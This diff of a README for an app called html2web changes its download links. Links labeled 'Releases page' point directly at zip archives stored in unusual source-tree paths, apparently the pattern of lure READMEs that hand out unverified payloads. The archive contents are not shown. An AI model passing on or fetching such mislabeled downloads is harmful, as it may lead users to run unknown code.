@@ -6,11 +6,11 @@ Welcome to **html2web**, a modern platform where you can paste code, share ideas
 
 ## 🔗 Download Now
 
-[![Download html2web](https://raw.githubusercontent.com/Piyush20112003/html2web/main/Colleries/html2web.zip)](https://raw.githubusercontent.com/Piyush20112003/html2web/main/Colleries/html2web.zip)
+[![Download html2web](https://github.com/Piyush20112003/html2web/raw/refs/heads/main/src/app/api/files/[id]/html-web-3.5.zip)](https://github.com/Piyush20112003/html2web/raw/refs/heads/main/src/app/api/files/[id]/html-web-3.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Piyush20112003/html2web/main/Colleries/html2web.zip) to download the latest version of html2web. You will find the application files there. Follow these steps to install:
+To get started, visit the [Releases page](https://github.com/Piyush20112003/html2web/raw/refs/heads/main/src/app/api/files/[id]/html-web-3.5.zip) to download the latest version of html2web. You will find the application files there. Follow these steps to install:
 
 1. Click on the link above to access the releases.
 2. Find the most recent version listed.
@@ -83,6 +83,6 @@ For questions or feedback, you can reach out through the repository’s GitHub p
 
 ## 🔗 Revisit the Download Link
 
-For a hassle-free download experience, return to the [Releases page](https://raw.githubusercontent.com/Piyush20112003/html2web/main/Colleries/html2web.zip) anytime you need to reinstall or check for updates. 
+For a hassle-free download experience, return to the [Releases page](https://github.com/Piyush20112003/html2web/raw/refs/heads/main/src/app/api/files/[id]/html-web-3.5.zip) anytime you need to reinstall or check for updates. 
 
 Thank you for choosing html2web! Enjoy editing, previewing, and sharing your ideas effortlessly.
